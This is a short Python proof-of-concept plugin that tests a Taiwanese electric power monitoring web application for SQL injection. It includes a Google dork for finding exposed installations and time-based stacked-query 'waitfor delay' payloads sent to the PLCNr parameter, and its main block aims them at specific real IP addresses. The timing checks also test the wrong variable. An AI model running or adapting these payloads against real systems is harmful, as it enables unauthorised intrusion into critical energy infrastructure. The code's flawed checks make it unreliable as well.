#!/usr/bin/env python
# coding: UTF-8

'''
author: yichin
name: 台湾省某电力监控系统通用型注入(二)
refer: http://www.wooyun.org/bugs/wooyun-2010-0102608
description:
    google dork:"智慧型電能監控管理系統"
    http://foorbar/ShowPower.aspx?Pic=2&PLCNr=1 Parameter: PLCNr (GET)
    type: stack queries, AND/OR time-baseed blind, boolean-based blind
'''

import re
import urlparse
import time

def assign(service, arg):
    if service == 'electric_monitor':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    waitfor_0 = arg + 'ShowPower.aspx?Pic=2&PLCNr=1;waitfor%20delay%20%270:0:0%27--'
    waitfor_5 = arg + 'ShowPower.aspx?Pic=2&PLCNr=1;waitfor%20delay%20%270:0:5%27--'
    code, head, res, err, _ = curl.curl2(arg)   #据说这样能提高准确率？
    t1 = time.time()
    code1, head, res, err, _ = curl.curl2(waitfor_0)
    if code == 0:
        return False
    t2 = time.time()
    code2, head, res, err, _ = curl.curl2(waitfor_5)
    if code == 0:
        return False
    t3 = time.time()
    if code1==500 and code2==500 and t2-t1<2 and t3-t2>5:
        security_hole('SQL injection: ' + waitfor_5)
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('electric_monitor','http://140.129.117.243/')[1])
    #audit(assign('electric_monitor','http://203.71.247.31/')[1])